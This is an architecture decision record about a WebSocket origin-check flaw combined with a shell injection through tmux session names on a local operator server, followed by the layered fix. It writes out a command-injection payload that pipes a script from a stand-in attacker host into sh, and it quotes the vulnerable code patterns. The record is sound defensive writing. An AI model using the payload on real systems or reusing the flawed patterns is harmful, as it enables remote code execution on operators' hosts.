# ADR 005 — Loopback is not a trust boundary

**Status:** Accepted · shipped
**Scope:** `server/src/ws/index.ts`, `server/src/tmux/session-name.ts`,
`server/src/tmux/session-manager.ts`, `server/src/config.ts`

## Context

The server binds `127.0.0.1` and has no authentication. The reasoning was that
loopback *is* the authentication: if only this machine can reach the socket, and
this machine is the operator's, then every client is the operator.

That reasoning has a hole, and the hole was exploitable.

**Loopback excludes other machines. It does not exclude other software on this
machine — and the browser is software on this machine that executes third-party
code continuously.** Any page in any tab can address `127.0.0.1`.

For HTTP that is survivable: the browser lets the request out but blocks the page
from reading the response. **WebSocket has no such protection.** There is no
preflight and no same-origin restriction on the handshake. A page on any site can
open `ws://127.0.0.1:4000/ws`, and both send and read messages. The only party
that can refuse it is the server, by inspecting the `Origin` header.

This server did not inspect it:

```ts
const wss = new WebSocketServer({ server, path });   // accepts every origin
```

### What a page could do

With no exploit beyond opening a socket:

- `session:list` — enumerate sessions, whose names carry project identity;
- `history:request` — `capture-pane -S -500` on any session: **500 lines of the
  operator's terminal**, which routinely contains tokens, environment output and
  agent transcripts;
- `channel:data` — **type into live agent sessions**.

### And a second defect turned that into arbitrary execution

The session-name guard checked a prefix and nothing else:

```ts
export function isCkptSession(name: unknown): name is string {
  return typeof name === 'string' && name.startsWith('ckpt-');
}
```

Its doc comment ran eight lines describing how strict it was — case sensitivity,
no implicit trim, no substring match. All of that defends against a *caller
mistake*: targeting the wrong session. None of it defends against *input*. And
the values it validates arrive unfiltered from the WebSocket protocol, which
accepts `sessionName` as any string.

Every command builder then interpolated the name into a shell string executed
over SSH on the production host:

```ts
`tmux capture-pane -e -p -S -500 -t ${sessionName}`
```

`ckpt-x; curl attacker.example/s.sh | sh; #` satisfies the guard.

**Full chain: visiting a web page while the cockpit is running executes arbitrary
commands on the operator's production host.** No XSS, no network exposure, no
user interaction beyond having the tab open.

A host firewall does not help, and it is worth saying why: there is no inbound
connection anywhere in the chain. The page is fetched outbound, connects to
loopback (which never reaches the network interface), and exfiltrates outbound.
From the firewall's point of view this is a person browsing the web.

## Decision

Four layers, none sufficient alone.

**1. Validate the `Origin` header on upgrade.** Connections are refused with 401
before they exist, so a rejected page never delivers a single protocol message.
Requests with **no** `Origin` are accepted: non-browser clients (tests, `wscat`,
a future CLI) do not send one, and they are not the threat — the threat is
specifically a browser acting for a foreign page.

**2. Validate the whole session name, not its prefix.** `^ckpt-[A-Za-z0-9_-]+$`.
Uppercase is tolerated because a session created by hand on the host may carry
it; none of the accepted characters means anything to `sh`.

**3. Quote every interpolation.** All four tmux command builders quote, even
though values that pass layer 2 need no quoting by construction. Defence that
depends on a caller remembering an invariant is not defence.

**4. Refuse a non-loopback `HOST` at boot.** The variable used to be honoured,
which meant a single environment variable put an unauthenticated control plane on
the network. Exposing the cockpit deliberately is a decision that requires
authentication *first*, not a config value.

## Consequences

**Good**

- The vector is closed at the entrance and the payload is inert at the exit.
- 26 adversarial tests: 18 injection payloads, origin matrix, quoting properties.
- Verified against the running production instance, not only in unit tests: an
  external origin receives 401 and the refusal is logged.
- The security claim in the README became true, having been aspirational before.

**Costs accepted**

- The Vite dev server's origin (`:5173`) is allowed, because it proxies `/ws` and
  the browser reports *its* origin. An attacker able to serve from loopback:5173
  already runs code on the machine — strictly worse than what this defends
  against.
- `HOST` is no longer a way to expose the cockpit. That is the point.

## How it was found

Not by the author, and not by a security review. The repository was being
prepared for publication, and a second agent was given an adversarial brief
whose instructions included the line *"the most likely source of error is the
agent that wrote these documents"*. It was looking for false claims in a README
and traced one of them — "binds `127.0.0.1` only" — into the code.

Worth recording because the defect had survived every ordinary check: tests
passed, types checked, the code had been reviewed and the guard carried a
detailed comment explaining its own strictness.

## Principles extracted

> Loopback is a network boundary, not a trust boundary. Anything that runs
> untrusted code on the same machine — every browser — is inside it.

> A guard's threat model must be written down, because a guard that defends
> against mistakes looks identical to one that defends against attackers. This
> one carried eight lines of documentation about its own strictness and was
> validating attacker-controlled input with a prefix check.

> Auditing the claims a project makes about itself is a way to find defects.
> Every promise in a README is an assertion about the code, and the ones that are
> merely aspirational tend to mark exactly where nobody has looked.
